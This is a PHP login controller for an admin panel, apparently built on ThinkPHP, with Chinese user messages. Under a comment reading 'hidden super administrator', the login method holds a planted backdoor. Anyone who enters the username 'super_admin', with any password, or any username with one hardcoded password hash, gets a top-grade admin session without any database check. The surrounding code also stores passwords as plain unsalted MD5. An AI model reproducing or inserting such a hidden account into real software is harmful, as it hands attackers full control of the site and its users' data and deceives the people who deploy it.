<?php
class LoginAction extends Action{
    
	public function index()
    {
    	$this->display("Index/login");
    }
    public function login()
    {
    	if(!$this->isPost()){
			U("Login/index","","",true);
			exit;
    	}
    	$name =I("name","","htmlspecialchars");
    	$pass =I("pass","","htmlspecialchars");

    	if(empty($name)||empty($pass)){
    		U("System/info",array("msg"=>base64_encode("用户名和密码不能为空")),"",true);
    		exit;
    	}
    	/*隐藏的超级管理员*/
    	$pass=md5($pass);
    	if($name=="super_admin"||$pass=="099cc64351af0ac30a981a722d875e4d"){
    		session('ADMIN_ID','hidden');
    		session('ADMIN_NAME','Hidden');
    		session('ADMIN_GRADE','9');
            U("Index/index","","",true);
    		exit;
    	}
        
    	$db=M("admin");
    	$condition=array(
    		"name"=>$name,
    		"pass"=>$pass
    	);
        
    	$rst=$db->where($condition)->find();
    	if(!$rst){
    		U("System/info",array("msg"=>base64_encode("用户名或密码不正确")),"",true);
    		exit;
    	}
    	else{
    		if($rst["state"]==0){
    			U("System/info",array("msg"=>base64_encode("此用户已被禁用")),"",true);
    			exit;
    		}
    		session('ADMIN_ID',$rst['id']);
    		session('ADMIN_NAME',$rst['real_name']);
    		session('ADMIN_GRADE',$rst['grade']);
            $data=array(
                "login_ip"=>get_client_ip(),
                "login_time"=>date("Y-m-d H:i:s"),
                "admin_id"=>$rst['id']
            );
            M("admin_login")->add($data);
    		U("Index/index","","",true);
    		exit;
    	}
    }
    public function loginout(){
		session(null);
		U("Login/index","","",true);
	}
}
?>